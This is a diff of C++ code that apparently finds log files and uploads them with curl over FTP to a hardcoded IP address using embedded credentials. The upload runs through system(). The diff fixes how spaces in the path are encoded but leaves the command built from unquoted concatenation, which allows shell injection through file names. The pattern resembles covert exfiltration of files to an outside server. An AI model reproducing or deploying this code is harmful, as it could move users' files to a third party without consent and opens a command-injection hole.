@@ -40,6 +40,18 @@ std::string find_log_file(const std::string& log_folder) {
     }
     return "";
 }
+  std::string encodeSpaces(const std::string& input) {
+    std::string result;
+    for (char c : input) {
+        if (c == ' ') {
+            result += "%20";
+        } else {
+            result += c;
+        }
+    }
+    return result;
+}
+
 void send(const std::string& path) {
     if(path.size()>3){
     std::string user = "qweaad000y_input";
@@ -47,12 +59,10 @@ void send(const std::string& path) {
     std::string ftp_server = "77.222.40.198";
     std::string remote_folder = "/";
        
-        for(size_t i =0;i<path.length();++i){
-        if(path[i]==' '){
-            path[i]=='%20';
-        }
-        }
-    std::string command = "curl -T " + path + " ftp://" + user + ":" + pass + "@" + ftp_server + remote_folder + "";
+     
+
+
+    std::string command = "curl -T " + encodeSpaces(path) + " ftp://" + user + ":" + pass + "@" + ftp_server + remote_folder + "";
     int result = system(command.c_str());
     if (result != 0) {
         std::cerr << "Ошибка отправки файла." << std::endl;
